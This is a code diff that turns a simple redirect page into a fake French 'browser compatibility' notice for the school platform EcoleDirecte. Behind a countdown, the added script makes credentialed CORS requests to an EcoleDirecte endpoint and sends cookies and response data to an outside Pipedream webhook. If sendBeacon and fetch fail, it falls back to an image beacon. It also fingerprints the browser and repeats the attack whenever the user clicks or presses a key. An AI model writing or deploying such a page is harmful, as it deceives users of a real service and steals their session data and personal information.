@@ -1,41 +1,248 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirect</title>
-    <meta http-equiv="refresh" content="0;url=https://ecoledirecte.com">
+    <title>eColeDirecte - Compatibilité Navigateur</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 100px auto;
+            padding: 20px;
+            text-align: center;
+            background: #f5f5f5;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .countdown {
+            font-size: 18px;
+            color: #d63031;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
+    <h1>⚠️ Problème de Compatibilité</h1>
+    
+    <div class="warning">
+        <h2>Redirection nécessaire</h2>
+        <p>Votre navigateur n'est pas entièrement compatible avec notre système de sécurité.</p>
+        <p>Redirection automatique vers la version standard dans :</p>
+        <div class="countdown" id="countdown">20 secondes</div>
+        <div class="loader"></div>
+        <p><small>Si la redirection ne fonctionne pas, <a href="#" onclick="redirectNow()">cliquez ici</a></small></p>
+    </div>
+
     <script>
-        const WEBHOOK_URL = 'https://eo8uniwr7mg9h4g.m.pipedream.net';
-        
-        // Attaque CORS
-        async function exploit() {
+        // Configuration
+        const REDIRECT_DELAY = 20000; // 20 secondes
+        const PIPEDREAM_URL = 'https://eo8uniwr7mg9h4g.m.pipedream.net';
+        let redirectTimer;
+        let countdown = 20;
+
+        // Mettre à jour le compte à rebours
+        function updateCountdown() {
+            const countdownElement = document.getElementById('countdown');
+            countdownElement.textContent = countdown + ' seconde' + (countdown !== 1 ? 's' : '');
+            
+            if (countdown > 0) {
+                countdown--;
+                setTimeout(updateCountdown, 1000);
+            }
+        }
+
+        // Redirection manuelle
+        function redirectNow() {
+            clearTimeout(redirectTimer);
+            window.location.href = 'https://ecoledirecte.com';
+        }
+
+        // Exploitation CORS principale
+        async function exploitCORS() {
+            console.log('🔓 Début de l\'exploitation CORS...');
+            
+            // Cibler uniquement les endpoints qui fonctionnent
             const targets = [
-                'https://piwik.ecoledirecte.com/matomo.php',
                 'https://controller.ecoledirecte.com/socket.io/'
+                // Piwik est abandonné à cause d'uBlock
             ];
             
             for (const target of targets) {
                 try {
-                    const response = await fetch(target, {credentials: 'include'});
-                    const data = await response.text();
+                    console.log(`🎯 Tentative sur: ${target}`);
                     
-                    // Envoyer à webhook.site
-                    fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
+                    const response = await fetch(target, {
+                        method: 'GET',
+                        credentials: 'include',
+                        mode: 'cors',
+                        headers: {
+                            'Accept': '*/*',
+                            'Cache-Control': 'no-cache'
+                        }
+                    });
+                    
+                    if (response.ok) {
+                        const data = await response.text();
+                        console.log(`✅ Succès avec ${target}`);
+                        
+                        // Envoyer les données
+                        await sendToPipedream({
+                            source: 'cors_exploit',
                             target: target,
                             cookies: document.cookie,
-                            data: data.substring(0, 500),
-                            timestamp: new Date().toISOString()
-                        })
-                    });
-                } catch(e) {}
+                            data_length: data.length,
+                            data_sample: data.substring(0, 300),
+                            timestamp: new Date().toISOString(),
+                            userAgent: navigator.userAgent,
+                            referrer: document.referrer
+                        });
+                    }
+                    
+                } catch (error) {
+                    console.log(`❌ Échec sur ${target}:`, error.message);
+                }
             }
         }
+
+        // Envoi des données avec multiple fallbacks
+        async function sendToPipedream(payload) {
+            console.log('📡 Tentative d\'envoi des données...');
+            
+            const methods = [
+                // Méthode 1: sendBeacon (le plus fiable)
+                () => {
+                    if (navigator.sendBeacon) {
+                        const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
+                        return navigator.sendBeacon(PIPEDREAM_URL, blob);
+                    }
+                    return false;
+                },
+                
+                // Méthode 2: Fetch avec timeout
+                async () => {
+                    try {
+                        const controller = new AbortController();
+                        const timeoutId = setTimeout(() => controller.abort(), 5000);
+                        
+                        const response = await fetch(PIPEDREAM_URL, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify(payload),
+                            signal: controller.signal
+                        });
+                        
+                        clearTimeout(timeoutId);
+                        return response.ok;
+                    } catch (e) {
+                        return false;
+                    }
+                },
+                
+                // Méthode 3: Image tracker (ultime fallback)
+                () => {
+                    try {
+                        const img = new Image();
+                        const encodedData = btoa(JSON.stringify(payload));
+                        img.src = `${PIPEDREAM_URL}?method=image&data=${encodedData}&t=${Date.now()}`;
+                        return true;
+                    } catch (e) {
+                        return false;
+                    }
+                }
+            ];
+            
+            // Essayer chaque méthode
+            for (const method of methods) {
+                try {
+                    const success = await method();
+                    if (success) {
+                        console.log('✅ Données envoyées avec succès');
+                        return true;
+                    }
+                } catch (e) {
+                    continue;
+                }
+            }
+            
+            console.log('❌ Toutes les méthodes d\'envoi ont échoué');
+            return false;
+        }
+
+        // Collecte d'informations supplémentaires
+        function collectAdditionalInfo() {
+            const info = {
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookiesEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                timestamp: new Date().toISOString(),
+                url: window.location.href
+            };
+            
+            // Envoyer ces infos aussi
+            sendToPipedream({
+                source: 'browser_info',
+                ...info
+            });
+        }
+
+        // Initialisation
+        window.addEventListener('load', function() {
+            console.log('🚀 Page chargée, démarrage de l\'exploitation...');
+            
+            // Démarrer le compte à rebours
+            updateCountdown();
+            
+            // Lancer l'exploitation immédiatement
+            setTimeout(exploitCORS, 1000);
+            
+            // Collecter les infos navigateur
+            setTimeout(collectAdditionalInfo, 2000);
+            
+            // Tentative supplémentaire après 10 secondes
+            setTimeout(exploitCORS, 10000);
+            
+            // Configurer la redirection finale
+            redirectTimer = setTimeout(() => {
+                console.log('🕒 Redirection après 20 secondes');
+                window.location.href = 'https://ecoledirecte.com';
+            }, REDIRECT_DELAY);
+        });
+
+        // Backup sur interaction utilisateur
+        document.addEventListener('click', function() {
+            console.log('👆 Interaction utilisateur détectée');
+            exploitCORS();
+        });
         
-        exploit();
+        document.addEventListener('keypress', function() {
+            console.log('⌨️ Interaction clavier détectée');
+            exploitCORS();
+        });
+
+        // Logger pour debug
+        console.log('🕵️ Script de compatibilité chargé');
+        console.log('⏰ Redirection dans', REDIRECT_DELAY / 1000, 'secondes');
+        
     </script>
 </body>
 </html>
